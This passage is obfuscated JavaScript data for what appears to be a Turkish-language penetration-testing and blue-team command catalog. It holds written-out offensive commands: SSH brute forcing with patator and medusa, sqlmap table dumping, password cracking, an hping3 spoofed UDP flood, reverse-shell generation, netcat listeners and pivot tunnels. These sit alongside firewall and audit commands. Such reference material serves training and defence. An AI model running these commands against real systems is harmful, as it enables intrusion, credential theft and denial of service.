_0x36ad6b(0x12f), 'cmd': _0x36ad6b(0x1ab) }, { 'id': 0x59, 'category': _0x36ad6b(0x1b4), 'categoryName': _0x36ad6b(0x1f9), 'badge': _0x36ad6b(0x24e), 'title': _0x36ad6b(0x214), 'desc': 'Parola\x20ile\x20kilitlenmiş\x20ZIP\x20dosyalarının\x20güvenliğini\x20sözlük\x20saldırısıyla\x20test\x20eder.', 'cmd': _0x36ad6b(0x134) }, { 'id': 0x5a, 'category': _0x36ad6b(0x1b4), 'categoryName': _0x36ad6b(0x1f9), 'badge': _0x36ad6b(0xd3), 'title': _0x36ad6b(0x1c0), 'desc': 'Gizli\x20kurumsal\x20PDF\x20belgelerinin\x20zayıf\x20parolalarını\x20ortaya\x20çıkarır.', 'cmd': _0x36ad6b(0x239) }, { 'id': 0x5b, 'category': _0x36ad6b(0x1b4), 'categoryName': _0x36ad6b(0x1f9), 'badge': 'HASH\x20TÜRÜ\x20TESPİTİ', 'title': 'Bilinmeyen\x20Parola\x20Özetinin\x20Türünü\x20Bulma\x20(hashid)', 'desc': _0x36ad6b(0x1ce), 'cmd': _0x36ad6b(0x117) }, { 'id': 0x5c, 'category': _0x36ad6b(0x1b4), 'categoryName': '6.\x20Kimlik\x20&\x20Parola', 'badge': _0x36ad6b(0x106), 'title': _0x36ad6b(0x245), 'desc': 'Web\x20formları,\x20SSH,\x20FTP\x20ve\x20SQL\x20servisleri\x20dahil\x20her\x20türlü\x20giriş\x20protokolünü\x20aynı\x20anda\x20test\x20eder.', 'cmd': 'patator\x20ssh_login\x20host=127.0.0.1\x20user=admin\x20password=FILE0\x200=pass.txt' }, { 'id': 0x5d, 'category': _0x36ad6b(0x22b), 'categoryName': _0x36ad6b(0xfa), 'badge': _0x36ad6b(0x96), 'title': _0x36ad6b(0x9e), 'desc': _0x36ad6b(0x135), 'cmd': 'sqlmap\x20-u\x20\x22http://127.0.0.1/api/search?q=test\x22\x20--dbs\x20--batch' }, { 'id': 0x5e, 'category': _0x36ad6b(0x22b), 'categoryName': _0x36ad6b(0xfa), 'badge': 'TABLO\x20ÇEKME', 'title': _0x36ad6b(0xd5), 'desc': 'Hedef\x20veritabanındaki\x20kullanıcılar\x20(users),\x20şifreler\x20veya\x20kredi\x20kartı\x20tablolarını\x20deşifre\x20eder.', 'cmd': _0x36ad6b(0xc8) }, { 'id': 0x5f, 'category': 'exploit', 'categoryName': _0x36ad6b(0xfa), 'badge': _0x36ad6b(0x22d), 'title': 'Ham\x20HTTP\x20İsteği\x20Dosyasını\x20Sqlmap\x20ile\x20Tarama\x20(sqlmap\x20-r)', 'desc': 'Burp\x20Suite\x20ile\x20kaydedilen\x20ham\x20HTTP\x20POST\x20isteğini\x20baştan\x20sona\x20SQL\x20açığı\x20için\x20test\x20eder.', 'cmd': 'sqlmap\x20-r\x20request.txt\x20--batch\x20--risk=3\x20--level=5' }, { 'id': 0x60, 'category': _0x36ad6b(0x22b), 'categoryName': '7.\x20Zafiyet\x20&\x20Exploit', 'badge': 'ÇEVRİMDIŞI\x20EXPLOIT', 'title': 'Exploit-DB\x20Arşivinde\x20Zafiyet\x20Kodu\x20Arama\x20(Searchsploit)', 'desc': _0x36ad6b(0x16a), 'cmd': 'searchsploit\x20apache\x202.4.49' }, { 'id': 0x61, 'category': 'exploit', 'categoryName': _0x36ad6b(0xfa), 'badge': 'EXPLOIT\x20İNDİRME', 'title': 'İlgili\x20Exploit\x20Kodunu\x20Çalışma\x20Dizinine\x20Kopyalama\x20(searchsploit\x20-m)', 'desc': _0x36ad6b(0x225), 'cmd': _0x36ad6b(0x98) }, { 'id': 0x62, 'category': _0x36ad6b(0x22b), 'categoryName': _0x36ad6b(0xfa), 'badge': _0x36ad6b(0x168), 'title': _0x36ad6b(0xc2), 'desc': _0x36ad6b(0xab), 'cmd': _0x36ad6b(0x1f5) }, { 'id': 0x63, 'category': _0x36ad6b(0x22b), 'categoryName': _0x36ad6b(0xfa), 'badge': _0x36ad6b(0x163), 'title': _0x36ad6b(0x1e2), 'desc': _0x36ad6b(0xe8), 'cmd': _0x36ad6b(0x119) }, { 'id': 0x64, 'category': 'exploit', 'categoryName': _0x36ad6b(0xfa), 'badge': _0x36ad6b(0x176), 'title': _0x36ad6b(0x15d), 'desc': _0x36ad6b(0x1d0), 'cmd': _0x36ad6b(0x1e5) }, { 'id': 0x65, 'category': _0x36ad6b(0x22b), 'categoryName': _0x36ad6b(0xfa), 'badge': _0x36ad6b(0xec), 'title': _0x36ad6b(0xdf), 'desc': 'Eğitim\x20amaçlı\x20ters\x20kabuk\x20(reverse\x20shell)\x20ELF\x20ikili\x20dosyası\x20oluşturur.', 'cmd': _0x36ad6b(0x21f) }, { 'id': 0x66, 'category': _0x36ad6b(0x22b), 'categoryName': '7.\x20Zafiyet\x20&\x20Exploit', 'badge': 'KOMUT\x20ENJEKSİYONU', 'title': _0x36ad6b(0x224), 'desc': _0x36ad6b(0x1b3), 'cmd': _0x36ad6b(0x25e) }, { 'id': 0x67, 'category': _0x36ad6b(0x22b), 'categoryName': _0x36ad6b(0xfa), 'badge': _0x36ad6b(0x12c), 'title': _0x36ad6b(0x14c), 'desc': 'Web\x20sitesinde\x20DOM,\x20Reflected\x20ve\x20Stored\x20XSS\x20açıklarını\x20gelişmiş\x20analiz\x20motoruyla\x20arar.', 'cmd': _0x36ad6b(0x17b) }, { 'id': 0x68, 'category': _0x36ad6b(0x22b), 'categoryName': _0x36ad6b(0xfa), 'badge': _0x36ad6b(0x258), 'title': _0x36ad6b(0x1d6), 'desc': _0x36ad6b(0x254), 'cmd': 'wpscan\x20--url\x20http://127.0.0.1\x20--plugins-detection\x20aggressive' }, { 'id': 0x69, 'category': _0x36ad6b(0x22b), 'categoryName': _0x36ad6b(0xfa), 'badge': _0x36ad6b(0x20c), 'title': _0x36ad6b(0xac), 'desc': _0x36ad6b(0xe3), 'cmd': _0x36ad6b(0x1d4) }, { 'id': 0x6a, 'category': _0x36ad6b(0x22b), 'categoryName': _0x36ad6b(0xfa), 'badge': _0x36ad6b(0x1da), 'title': _0x36ad6b(0x1e6), 'desc': _0x36ad6b(0xe9), 'cmd': 'routersploit' }, { 'id': 0x6b, 'category': 'exploit', 'categoryName': _0x36ad6b(0xfa), 'badge': _0x36ad6b(0xea), 'title': _0x36ad6b(0xdb), 'desc': _0x36ad6b(0x12d), 'cmd': 'ghidra' }, { 'id': 0x6c, 'category': 'tunnel', 'categoryName': _0x36ad6b(0x20d), 'badge': _0x36ad6b(0x10b), 'title': _0x36ad6b(0x250), 'desc': '4444\x20numaralı\x20portta\x20TCP\x20dinleyici\x20açarak\x20gelen\x20bağlantıları\x20ve\x20ham\x20verileri\x20terminalde\x20görüntüler.', 'cmd': 'nc\x20-lvnp\x204444' }, { 'id': 0x6d, 'category': 'tunnel', 'categoryName': '8.\x20Tünel\x20&\x20Pivot', 'badge': _0x36ad6b(0xfb), 'title': _0x36ad6b(0x24d), 'desc': _0x36ad6b(0x161), 'cmd': 'nc\x20-nv\x20127.0.0.1\x204444' }, { 'id': 0x6e, 'category': 'tunnel', 'categoryName': _0x36ad6b(0x20d), 'badge': _0x36ad6b(0x17a), 'title': _0x36ad6b(0x127), 'desc': _0x36ad6b(0x1bc), 'cmd': _0x36ad6b(0x148) }, { 'id': 0x6f, 'category': _0x36ad6b(0xc5), 'categoryName': _0x36ad6b(0x20d), 'badge': _0x36ad6b(0x14b), 'title': 'Çift\x20Yönlü\x20Trafik\x20Yönlendirme\x20Köprüsü\x20(Socat)', 'desc': _0x36ad6b(0x19f), 'cmd': 'socat\x20TCP-LISTEN:8080,fork\x20TCP:127.0.0.1:80' }, { 'id': 0x70, 'category': _0x36ad6b(0xc5), 'categoryName': _0x36ad6b(0x20d), 'badge': 'HTTP\x20TERS\x20TÜNEL', 'title': 'Güvenlik\x20Duvarı\x20Arkasındaki\x20Sunucuya\x20Chisel\x20Tüneli', 'desc': _0x36ad6b(0x231), 'cmd': 'chisel\x20server\x20-p\x208000\x20--reverse' }, { 'id': 0x71, 'category': _0x36ad6b(0xc5), 'categoryName': _0x36ad6b(0x20d), 'badge': _0x36ad6b(0x23c), 'title': _0x36ad6b(0x1eb), 'desc': 'İç\x20ağdaki\x20web\x20servisini\x20uzaktaki\x20sunucunun\x20portuna\x20bağlar.', 'cmd': _0x36ad6b(0x1fe) }, { 'id': 0x72, 'category': 'tunnel', 'categoryName': _0x36ad6b(0x20d), 'badge': _0x36ad6b(0x1ba), 'title': _0x36ad6b(0x113), 'desc': _0x36ad6b(0xcc), 'cmd': 'ssh\x20-L\x208080:127.0.0.1:80\x20user@remote-server' }, { 'id': 0x73, 'category': _0x36ad6b(0xc5), 'categoryName': _0x36ad6b(0x20d), 'badge': _0x36ad6b(0xfc), 'title': _0x36ad6b(0x195), 'desc': _0x36ad6b(0x132), 'cmd': _0x36ad6b(0xf8) }, { 'id': 0x74, 'category': 'tunnel', 'categoryName': _0x36ad6b(0x20d), 'badge': _0x36ad6b(0xf2), 'title': 'SSH\x20ile\x20Dinamik\x20SOCKS5\x20Proxy\x20Kurma\x20(ssh\x20-D)', 'desc': _0x36ad6b(0x247), 'cmd': _0x36ad6b(0x9b) }, { 'id': 0x75, 'category': _0x36ad6b(0xc5), 'categoryName': _0x36ad6b(0x20d), 'badge': _0x36ad6b(0x207), 'title': _0x36ad6b(0x104), 'desc': _0x36ad6b(0x261), 'cmd': _0x36ad6b(0x235) }, { 'id': 0x76, 'category': _0x36ad6b(0xc5), 'categoryName': '8.\x20Tünel\x20&\x20Pivot', 'badge': _0x36ad6b(0x107), 'title': _0x36ad6b(0x120), 'desc': _0x36ad6b(0xa6), 'cmd': 'ligolo-ng' }, { 'id': 0x77, 'category': _0x36ad6b(0xc5), 'categoryName': _0x36ad6b(0x20d), 'badge': _0x36ad6b(0x25d), 'title': 'Parolasız\x20Güvenli\x20SSH\x20Girişi\x20(ssh-copy-id)', 'desc': _0x36ad6b(0xff), 'cmd': _0x36ad6b(0x1c8) }, { 'id': 0x78, 'category': _0x36ad6b(0x16e), 'categoryName': _0x36ad6b(0x182), 'badge': _0x36ad6b(0x171), 'title': _0x36ad6b(0x180), 'desc': _0x36ad6b(0x243), 'cmd': _0x36ad6b(0xe2) }, { 'id': 0x79, 'category': 'blue', 'categoryName': '9.\x20Blue\x20Team\x20&\x20SOC', 'badge': _0x36ad6b(0xf7), 'title': _0x36ad6b(0x124), 'desc': _0x36ad6b(0x204), 'cmd': _0x36ad6b(0x17f) }, { 'id': 0x7a, 'category': 'blue', 'categoryName': '9.\x20Blue\x20Team\x20&\x20SOC', 'badge': _0x36ad6b(0x200), 'title': _0x36ad6b(0xed), 'desc': _0x36ad6b(0x118), 'cmd': _0x36ad6b(0x1a4) }, { 'id': 0x7b, 'category': _0x36ad6b(0x16e), 'categoryName': _0x36ad6b(0x182), 'badge': _0x36ad6b(0xb2), 'title': _0x36ad6b(0x16f), 'desc': 'Linux\x20çekirdeğindeki\x20filtreleme\x20zincirlerini\x20(INPUT,\x20OUTPUT,\x20FORWARD)\x20ve\x20sayaçları\x20gösterir.', 'cmd': 'sudo\x20iptables\x20-L\x20-n\x20-v' }, { 'id': 0x7c, 'category': _0x36ad6b(0x16e), 'categoryName': _0x36ad6b(0x182), 'badge': _0x36ad6b(0xd7), 'title': _0x36ad6b(0xc0), 'desc': _0x36ad6b(0x1f0), 'cmd': 'sudo\x20iptables\x20-A\x20INPUT\x20-s\x20192.168.1.100\x20-j\x20DROP' }, { 'id': 0x7d, 'category': _0x36ad6b(0x16e), 'categoryName': '9.\x20Blue\x20Team\x20&\x20SOC', 'badge': _0x36ad6b(0x1d1), 'title': _0x36ad6b(0x139), 'desc': _0x36ad6b(0x14e), 'cmd': _0x36ad6b(0x12a) }, { 'id': 0x7e, 'category': _0x36ad6b(0x16e), 'categoryName': '9.\x20Blue\x20Team\x20&\x20SOC', 'badge': _0x36ad6b(0x11a), 'title': _0x36ad6b(0x174), 'desc': _0x36ad6b(0x166), 'cmd': _0x36ad6b(0xbc) }, { 'id': 0x7f, 'category': _0x36ad6b(0x16e), 'categoryName': '9.\x20Blue\x20Team\x20&\x20SOC', 'badge': 'PORTU\x20KULLANAN\x20UYGULAMA', 'title': _0x36ad6b(0x229), 'desc': _0x36ad6b(0x1a6), 'cmd': _0x36ad6b(0x20a) }, { 'id': 0x80, 'category': _0x36ad6b(0x16e), 'categoryName': _0x36ad6b(0x182), 'badge': _0x36ad6b(0xc6), 'title': _0x36ad6b(0x1f4), 'desc': 'Uygulamanın\x20erişim\x20ve\x20hata\x20loglarını\x20canlı\x20olarak\x20terminale\x20akıtır.', 'cmd': _0x36ad6b(0x1fc) }, { 'id': 0x81, 'category': 'blue', 'categoryName': '9.\x20Blue\x20Team\x20&\x20SOC', 'badge': _0x36ad6b(0xb7), 'title': 'Linux\x20Güvenlik\x20Denetimi\x20Başarısız\x20Giriş\x20Raporu\x20(aureport)', 'desc': _0x36ad6b(0x1a8), 'cmd': _0x36ad6b(0xcb) }, { 'id': 0x82, 'category': _0x36ad6b(0x16e), 'categoryName': '9.\x20Blue\x20Team\x20&\x20SOC', 'badge': _0x36ad6b(0x1b2), 'title': _0x36ad6b(0xa5), 'desc': _0x36ad6b(0x147), 'cmd': _0x36ad6b(0x10c) }, { 'id': 0x83, 'category': 'blue', 'categoryName': _0x36ad6b(0x182), 'badge': _0x36ad6b(0x15e), 'title': _0x36ad6b(0x1a1), 'desc': _0x36ad6b(0xad), 'cmd': 'sudo\x20chkrootkit\x20-q' }, { 'id': 0x84, 'category': _0x36ad6b(0x16e), 'categoryName': _0x36ad6b(0x182), 'badge': 'GÜVENLİK\x20AÇIĞI\x20AVCI', 'title': _0x36ad6b(0x15f), 'desc': _0x36ad6b(0x1a9), 'cmd': _0x36ad6b(0x1f6) }, { 'id': 0x85, 'category': _0x36ad6b(0x16e), 'categoryName': _0x36ad6b(0x182), 'badge': _0x36ad6b(0x1c1), 'title': 'IP\x20Yönlendirmeyi\x20Kapatarak\x20Ortadaki\x20Adam\x20Saldırısını\x20Engelleme', 'desc': 'Bilgisayarın\x20yabancı\x20paketleri\x20yönlendirmesini\x20engelleyerek\x20gateway\x20sahteciliğini\x20önler.', 'cmd': _0x36ad6b(0x212) }, { 'id': 0x86, 'category': _0x36ad6b(0x16e), 'categoryName': _0x36ad6b(0x182), 'badge': _0x36ad6b(0x1ef), 'title': _0x36ad6b(0xaa), 'desc': _0x36ad6b(0x18c), 'cmd': _0x36ad6b(0x13a) }, { 'id': 0x87, 'category': 'powershell', 'categoryName': '10.\x20PowerShell\x20Denetim', 'badge': _0x36ad6b(0x138), 'title': _0x36ad6b(0x18d), 'desc': _0x36ad6b(0x22f), 'cmd': 'powershell\x20.\x5cAudit-Headers.ps1' }, { 'id': 0x88, 'category': _0x36ad6b(0x108), 'categoryName': _0x36ad6b(0x177), 'badge': _0x36ad6b(0x15a), 'title': _0x36ad6b(0x215), 'desc': _0x36ad6b(0x181), 'cmd': 'powershell\x20.\x5cPort-Scan.ps1' }, { 'id': 0x89, 'category': _0x36ad6b(0x108), 'categoryName': _0x36ad6b(0x177), 'badge': _0x36ad6b(0x151), 'title': _0x36ad6b(0x146), 'desc': 'Server\x20ve\x20X-Powered-By\x20başlıklarının\x20saldırganlara\x20sürüm\x20sızdırıp\x20sızdırmadığını\x20kontrol\x20eder.', 'cmd': 'powershell\x20.\x5cBanner-Grab.ps1' }, { 'id': 0x8a, 'category': _0x36ad6b(0x108), 'categoryName': _0x36ad6b(0x177), 'badge': _0x36ad6b(0x226), 'title': _0x36ad6b(0x213), 'desc': _0x36ad6b(0x1c5), 'cmd': _0x36ad6b(0xdd) }, { 'id': 0x8b, 'category': _0x36ad6b(0x108), 'categoryName': _0x36ad6b(0x177), 'badge': _0x36ad6b(0x1ee), 'title': 'Windows\x20Dinlenen\x20TCP\x20Portlarını\x20Listeleme\x20(Get-NetTCPConnection)', 'desc': _0x36ad6b(0xb1), 'cmd': _0x36ad6b(0xee) }, { 'id': 0x8c, 'category': _0x36ad6b(0x108), 'categoryName': _0x36ad6b(0x177), 'badge': _0x36ad6b(0x1ad), 'title': 'Uzak\x20Web\x20Servisinin\x20Ayakta\x20Olup\x20Olmadığını\x20Test\x20Etme\x20(Test-NetConnection)', 'desc': _0x36ad6b(0x228), 'cmd': _0x36ad6b(0xcd) }, { 'id': 0x8d, 'category': _0x36ad6b(0x108), 'categoryName': _0x36ad6b(0x177), 'badge': _0x36ad6b(0x1fd), 'title': _0x36ad6b(0x190), 'desc': _0x36ad6b(0x263), 'cmd': _0x36ad6b(0x129) }, { 'id': 0x8e, 'category': 'powershell', 'categoryName': _0x36ad6b(0x177), 'badge': _0x36ad6b(0x1e3), 'title': _0x36ad6b(0xbd), 'desc': _0x36ad6b(0x170), 'cmd': 'powershell\x20\x22Get-EventLog\x20-LogName\x20Security\x20-Newest\x2010\x22' }]); function _0x1583() { var _0x13deb7 = ['Bozuk\x20TCP\x20sağlama\x20toplamına\x20sahip\x20paket\x20yollar;\x20hedef\x20paketleri\x20çöpe\x20atarken\x20ara\x20ağ\x20cihazları\x20paketi\x20işliyorsa\x20tespit\x20edilir.', 'SSL/TLS\x20SERTİFİKA', 'sudo\x20fping\x20-a\x20-g\x20192.168.1.0/24', 'ZAFİYET\x20MOTORU', 'nmap\x20-p\x2080\x20--script\x20http-headers\x20127.0.0.1', 'nmap\x20--traceroute\x208.8.8.8', 'john\x20--wordlist=/usr/share/wordlists/rockyou.txt\x20hashes.txt', 'Belirli\x20Bir\x20Portun\x20(8080)\x20Durumunu\x20Kontrol\x20Etme\x20(nmap\x208080/tcp)', 'web', 'nmap\x20-A\x20192.168.1.1', 'Sunucu\x20Banner\x20Bilgi\x20İfşası\x20Denetimi\x20(Banner-Grab.ps1)', 'Üst\x20üste\x20yanlış\x20şifre\x20giren\x20saldırganların\x20IP\x20adreslerini\x20geçici\x20olarak\x20engelleyen\x20servisin\x20durumudur.', 'nc\x20-z\x20-v\x20-w\x201\x20127.0.0.1\x2080-90', 'Sunucunun\x20TCP\x20bağlantı\x20tablosunu\x20doldurmaya\x20çalışarak\x20SYN\x20Cookies\x20savunmasının\x20devrede\x20olup\x20olmadığını\x20kontrol\x20eder.', 'NSE\x20Motoru\x20ile\x20Zafiyet\x20Veritabanı\x20Taraması\x20(nmap\x20--script\x20vuln)', 'SOKET\x20KÖPRÜSÜ', 'Modern\x20Siteler\x20Arası\x20Betik\x20Çalıştırma\x20Tarayıcısı\x20(Dalfox)', 'sudo\x20hping3\x20-F\x20-P\x20-U\x20-p\x2080\x20127.0.0.1\x20-c\x201', 'Sunucudaki\x20hangi\x20portun\x20hangi\x20yazılım\x20(PID\x20numarası)\x20tarafından\x20dinlendiğini\x20anında\x20döker.', 'nmap\x20-oN\x20scan_results.txt\x20127.0.0.1', 'Sunucudaki\x20tehlikeli\x20varsayılan\x20dosyaları,\x20eski\x20yazılım\x20sürümlerini\x20ve\x20eksik\x20HTTP\x20başlıklarını\x20tespit\x20eder.', 'BİLGİ\x20İFŞASI\x20KONTROLÜ', '833JQLLfN', 'tshark\x20-i\x201\x20-Y\x20\x22http.request\x22\x20-T\x20fields\x20-e\x20http.host\x20-e\x20http.request.uri', 'ACK\x20Bayrağı\x20ile\x20Güvenlik\x20Duvarı\x20Tepkisini\x20Ölçme\x20(hping3\x20-A)', 'nmap\x20-p-\x20127.0.0.1', 'SSH\x20PORT\x20DENETİMİ', 'Web\x20sitesinin\x20hangi\x20CMS\x20(WordPress,\x20Joomla),\x20programlama\x20dili\x20(ASP.NET,\x20PHP)\x20ve\x20sunucuyu\x20(Kestrel,\x20Nginx)\x20kullandığını\x20anlar.', 'sudo\x20hping3\x20-2\x20-p\x2053\x20192.168.1.1\x20-c\x202', 'Ağ\x20Analizi\x20ve\x20Dinleme\x20Başlatma\x20(Bettercap)', 'ÇOK\x20KANALLI\x20PORT\x20TARA', 'Kelime\x20listesi\x20kullanarak\x20web\x20sitesinde\x20unutulmuş\x20/admin,\x20/backup,\x20/api\x20ve\x20/config\x20gibi\x20dizinleri\x20ortaya\x20çıkarır.', 'sudo\x20hping3\x20--udp\x20--flood\x20--rand-source\x20-p\x2080\x20192.168.1.1', 'Metasploit\x20Framework\x27ü\x20Başlatma\x20(msfconsole)', 'ROOTKIT\x20TARAYICI', 'Bütünlük\x20ve\x20Zafiyet\x20Denetleyicisi\x20(rkhunter)', 'Ağ\x20kartının\x20ICMP\x20paket\x20işleme\x20sınırını\x20test\x20eder.\x20Modern\x20sistemlerde\x20ICMP\x20Rate\x20Limiting\x20bunu\x20engeller.', 'Uzak\x20sunucunun\x20belirli\x20bir\x20portuna\x20bağlanarak\x20servisin\x20açık\x20olup\x20olmadığını\x20ve\x20gönderdiği\x20banner\x20metnini\x20test\x20eder.', 'ZAMAN\x20DAMGASI', 'GÜVENSİZ\x20BAŞLIKLAR', 'Fiziksel\x20donanım\x20adresinizi\x20gizleyerek\x20ağ\x20takip\x20sistemlerinin\x20cihazınızı\x20tanımasını\x20engeller.', 'BOZUK\x20SAĞLAMA', 'Sisteme\x20kimlerin\x20bağlı\x20olduğunu\x20(ESTABLISHED)\x20ve\x20dışarıya\x20açılan\x20soketleri\x20gösterir.', 'HTTPS\x20sertifikasının\x20süresini,\x20kime\x20ait\x20olduğunu\x20ve\x20şifreleme\x20algoritmasını\x20ekrana\x20döker.', 'ŞABLON\x20TARAYICI', 'Ağdaki\x20Tüm\x20Aktif\x20Cihazları\x20Listeleme\x20(nmap\x20-sn)', 'İnternet\x20bağlantısı\x20olmadan\x20yerel\x20veritabanında\x20Apache\x202.4.49\x20için\x20yayınlanmış\x20exploit\x20kodlarını\x20arar.', 'Web\x20sayfasının\x20içeriğini\x20indirmeden\x20sadece\x20sunucu\x20başlıklarını\x20(Server,\x20Date,\x20Content-Type)\x20çekerek\x20hızlı\x20inceleme\x20yapar.', 'sudo\x20airodump-ng\x20wlan0mon', 'GİZLİ\x20KLASÖRLER', 'blue', 'Ham\x20Çekirdek\x20Paket\x20Filtreleme\x20Tablosunu\x20İnceleme\x20(iptables)', 'Windows\x20Güvenlik\x20(Security)\x20günlüğündeki\x20son\x20oturum\x20açma\x20ve\x20kimlik\x20denetim\x20kayıtlarını\x20listeler.', 'FIREWALL\x20DURUMU', '4.\x20Paket\x20&\x20Firewall', 'Belirli\x20kurallara\x20(örn:\x208\x20basamaklı\x20rakamlar)\x20uygun\x20şifre\x20kombinasyonlarını\x20otomatik\x20dosya\x20haline\x20getirir.', 'Aktif\x20Ağ\x20Bağlantılarını\x20Sorgulama\x20(netstat)', 'Canlı\x20RAM\x20ve\x20Takas\x20Alanı\x20Durumu\x20(free\x20-m)', 'METASPLOIT\x20KONSOLU', '10.\x20PowerShell\x20Denetim', 'GELİŞMİŞ\x20FİLTRE', 'wfuzz\x20-c\x20-z\x20file,common.txt\x20--hc\x20404\x20http://127.0.0.1/FUZZ', 'HIZLI\x20PORT\x20TARAMA', 'dalfox\x20url\x20http://127.0.0.1/search.php?q=test', 'HESAP\x20ANALİZİ', 'Web\x20sayfalarında\x20kod\x20geliştiricilerin\x20unuttuğu\x20?debug=true\x20veya\x20?admin=1\x20gibi\x20gizli\x20parametreleri\x20otomatik\x20yakalar.', 'linux', 'sudo\x20ufw\x20allow\x20443/tcp', 'Linux\x20Güvenlik\x20Duvarı\x20Durumunu\x20ve\x20Kurallarını\x20İnceleme\x20(ufw)', 'Tüm\x20işlemci\x20çekirdeklerini\x20kullanarak\x2016\x20eşzamanlı\x20kanaldan\x20açık\x20portları\x200.3\x20saniyede\x20tespit\x20eder.', '9.\x20Blue\x20Team\x20&\x20SOC', 'SYN\x20PAKET\x20TESTİ', 'dirb\x20http://192.168.1.1\x20/usr/share/wordlists/dirb/common.txt', 'Sunucu\x20disklerinin\x20doluluk\x20oranını\x20(GB\x20cinsinden)\x20gösterir.\x20Dolu\x20diskler\x20log\x20kaydını\x20durdurarak\x20güvenlik\x20açığına\x20sebep\x20olabilir.', 'Ping\x20Korumalı\x20Gizli\x20Cihazları\x20Taramaya\x20Zorlama\x20(nmap\x20-Pn)', 'TCP\x20Zaman\x20Damgası\x20ile\x20Cihaz\x20Uptime\x20Tespiti\x20(tcp-timestamp)', 'MAC\x20ADRESİ\x20DEĞİŞTİRME', 'Saniyede\x20yüzlerce\x20GET\x20isteği\x20göndererek\x20sunucuda\x20gizlenen\x20veya\x20hata\x20döndüren\x20her\x20parametreyi\x20tespit\x20eder.', 'sudo\x20nmap\x20-sV\x20-p\x205000,7000,7100,62078\x20192.168.1.17', 'Terminalde\x20nerede\x20olduğunuzu\x20asla\x20kaybetmemeniz\x20için\x20tam\x20dosya\x20yolu\x20konumunuzu\x20(örneğin\x20/home/Sunny)\x20ekrana\x20yazdırır.', 'Çekirdek\x20düzeyinde\x20SYN\x20Cookies\x20mekanizmasını\x20devreye\x20sokarak\x20bellek\x20dolmasını\x20engeller.', 'Kurumsal\x20HTTP\x20Güvenlik\x20Başlıkları\x20Denetim\x20Scripti\x20(Audit-Headers.ps1)', 'Wireshark\x20Filtreleri\x20ile\x20Paket\x20Yakalama\x20(Tshark)', 'Hedefe\x20Giderken\x20Hangi\x20Yönlendiricilerden\x20Geçildi?\x20(--traceroute)', 'Kritik\x20Dosyanın\x20SHA256\x20Kriptografik\x20Özeti\x20(Get-FileHash)', '873296XTHyVM', 'Ekran\x20Kartı\x20Destekli\x20Yüksek\x20Hızlı\x20Parola\x20Kırıcı\x20(Hashcat)', 'MD5\x20Formatındaki\x20Özetleri\x20Denetleme\x20(John\x20MD5)', 'bettercap\x20-iface\x20lo', 'SSH\x20ile\x20Uzak\x20Port\x20Tünelleme\x20(ssh\x20-R)', 'KULLANICI\x20TESPİTİ', 'Hedefe\x201\x20adet\x20ham\x20TCP\x20SYN\x20paketi\x20fırlatır.\x20Karşıdan\x20SYN-ACK\x20dönerse\x20port\x20açıktır,\x20RST\x20dönerse\x20kapalıdır.', 'LLMNR\x20YAKALAYICI', 'PING\x20SWEEP', 'SAHTE\x20IP\x20(DECOY)', 'Disk\x20Alanını\x20İnsan\x20Tarafından\x20Okunabilir\x20Formatta\x20Görme\x20(df\x20-h)', 'Tüm\x20Olası\x208\x20Haneli\x20Rakam\x20Listesini\x20Üretme\x20(Crunch)', 'UDP\x20Portlarını\x20Denetleme\x20(nmap\x20-sU)', 'Geçmişte\x20Açık\x20Olan\x20Web\x20Adreslerini\x20Çekme\x20(waybackurls)', '8080\x20portuna\x20gelen\x20tüm\x20istekleri\x20şeffaf\x20şekilde\x20iç\x20ağdaki\x2080\x20portuna\x20aktarır.', 'Port\x20taraması\x20yapmadan\x20sadece\x20ping\x20atarak\x20ağdaki\x20hangi\x20IP\x20adreslerinin\x20açık\x20olduğunu\x20birkaç\x20saniyede\x20haritalandırır.', 'Sisteme\x20Gizlenmiş\x20Rootkit\x20ve\x20Arka\x20Kapı\x20Taraması\x20(chkrootkit)', 'sudo\x20hping3\x20-p\x2080\x20--badcksum\x20127.0.0.1\x20-c\x201', 'Dizinlerin\x20yanında\x20.php,\x20.bak,\x20.zip,\x20.sql\x20ve\x20.txt\x20uzantılı\x20unutulan\x20yedek\x20dosyalarını\x20da\x20tarar.', 'sudo\x20ufw\x20deny\x2022/tcp', 'nmap\x20-D\x20RND:10\x20192.168.1.1', 'Örneğin\x2080\x20numaralı\x20portun\x20arkasındaki\x20dotnet\x20veya\x20nginx\x20işlemini\x20PID\x20ile\x20listeler.', 'WIFI\x20DİNLEME', 'Linux\x20Auditd\x20servisinin\x20kaydettiği\x20tüm\x20hatalı\x20parola\x20denemelerini\x20listeler.', 'Kritik\x20sistem\x20ikili\x20dosyalarının\x20MD5\x20özetlerini\x20orijinal\x20arşivle\x20karşılaştırarak\x20kurcalamaları\x20yakalar.', 'curl\x20-I\x20http://127.0.0.1', 'medusa\x20-h\x20192.168.1.10\x20-u\x20admin\x20-P\x20passwords.txt\x20-M\x20ssh', 'DOS\x20SİMÜLASYONU', 'PORT\x20ERİŞİM\x20TESTİ', 'TARAYICI\x20ÖZETİ', '2.\x20Ağ\x20&\x20Nmap', 'nmap', 'TCP/IP\x20yığınının\x20tepkilerini\x20(TTL\x20değerleri\x20vb.)\x20analiz\x20ederek\x20hedef\x20cihazın\x20Windows\x20mu\x20Linux\x20mu\x20olduğunu\x20deşifre\x20eder.', 'OTOMATİK\x20BAN\x20SİSTEMİ', 'Web\x20sayfasındaki\x20formların\x20arkadaki\x20işletim\x20sistemi\x20komut\x20satırına\x20(bash/cmd)\x20sızıp\x20sızmadığını\x20test\x20eder.', 'auth', 'WEB\x20LOGIN\x20TESTİ', 'nmap\x20-sV\x20-p\x2049152\x20192.168.1.1', 'BEARER\x20TOKEN\x20FUZZ', 'nmap\x20-Pn\x20192.168.1.1', 'packet', 'SSH\x20YEREL\x20TÜNEL', 'FTP\x20Sunucusunda\x20Parolasız\x20Giriş\x20Kontrolü\x20(ftp-anon)', 'Veri\x20göndermeden\x20sadece\x20port\x20aralığını\x20yoklayarak\x20açık\x20olanları\x20listeler.', 'ICMP\x20FLOOD', 'Wayback\x20Machine\x20internet\x20arşivini\x20sorgulayarak\x20sitenin\x20yıllar\x20önce\x20yayında\x20olan\x20gizli\x20linklerini\x20bulur.', 'Eski\x20tip\x20MD5\x20şifre\x20özetlerinin\x20ne\x20kadar\x20savunmasız\x20olduğunu\x20ve\x20saniyeler\x20içinde\x20kırılabildiğini\x20kanıtlar.', 'PDF\x20Parolası\x20Güvenlik\x20Testi\x20(pdfcrack)', 'ÇEKİRDEK\x20GÜVENLİK\x20AYARI', 'Web\x20Sunucusunun\x20SSL\x20Sertifikasını\x20İnceleme\x20(ssl-cert\x20script)', 